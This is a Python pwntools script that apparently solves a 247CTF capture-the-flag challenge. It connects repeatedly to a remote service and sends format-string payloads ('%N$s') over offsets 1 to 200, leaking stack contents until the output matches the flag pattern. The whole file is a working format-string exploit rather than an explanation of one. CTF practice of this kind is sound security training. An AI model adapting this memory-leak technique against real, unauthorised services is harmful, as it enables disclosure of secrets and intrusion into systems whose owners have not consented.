#!/usr/bin/env python3
from pwn import *
import re

HOST = "bfd8e45c553fd640.247ctf.com"
PORT = 50092

context.log_level = "error"

pattern = re.compile(rb"247CTF\{.*?\}")

for i in range(1, 201):
    fmt = f"%{i}$s".encode()
    try:
        r = remote(HOST, PORT, timeout=5)
        r.recvuntil(b"again?\n")
        r.sendline(fmt)
        data = r.recvuntil(b"again?\n")
        r.close()
    except EOFError:
        print(f"{i}: connection closed")
        continue
    except Exception as e:
        print(f"{i}: error {e}")
        continue
    print(f"{i}: {data!r}")
    m = pattern.search(data)
    if m:
        print(f"FLAG: {m.group(0).decode()}")
        break
